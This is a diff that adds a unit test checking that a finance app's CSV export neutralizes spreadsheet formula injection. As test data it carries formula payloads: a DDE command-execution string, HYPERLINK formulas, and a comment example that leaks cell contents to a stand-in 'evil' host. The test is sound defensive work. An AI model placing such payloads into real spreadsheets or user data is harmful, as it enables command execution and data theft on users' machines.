@@ -27,6 +27,27 @@ describe('exportCsv', () => {
 		const csvMap = await exportCsv(db);
 		expect(csvMap.get('transactions')).toBe('');
 	});
+
+	it('neutralizes CSV formula injection in user content', async () => {
+		// A payee/description beginning with = + - @ or TAB is executed as a
+		// formula when the CSV is opened in Excel/LibreOffice — a real
+		// exfiltration vector (=HYPERLINK("http://evil/?x="&A1)). csvEscape must
+		// prefix such values with a single quote so spreadsheets treat them as
+		// text. Today it only escapes , " \n and passes formulas through verbatim.
+		const id = await accounts.createAccount(db, { name: '=CMD|"/c calc"!A1', type: 'checking', currency: 'VND' });
+		await db.execute(
+			`INSERT INTO transactions (id, kind, date, amount, account_id, tag_id, payee, created_at, updated_at)
+			 VALUES (?, 'expense', ?, 1000, ?, 'tag_loss', '+1+HYPERLINK("http://evil")', ?, ?)`,
+			['tx1', '2026-01-01', id, '2026-01-01', '2026-01-01']
+		);
+		const csvMap = await exportCsv(db);
+		const accountsCsv = csvMap.get('accounts')!;
+		// The leading = must be neutralized to a text literal.
+		expect(accountsCsv).toContain("'=CMD|");
+		expect(accountsCsv).not.toMatch(/[^']=[A-Z]/); // no un-neutralized =formula
+		const txnsCsv = csvMap.get('transactions')!;
+		expect(txnsCsv).toContain("'+1+HYPERLINK");
+	});
 });
 
 describe('validateImport', () => {
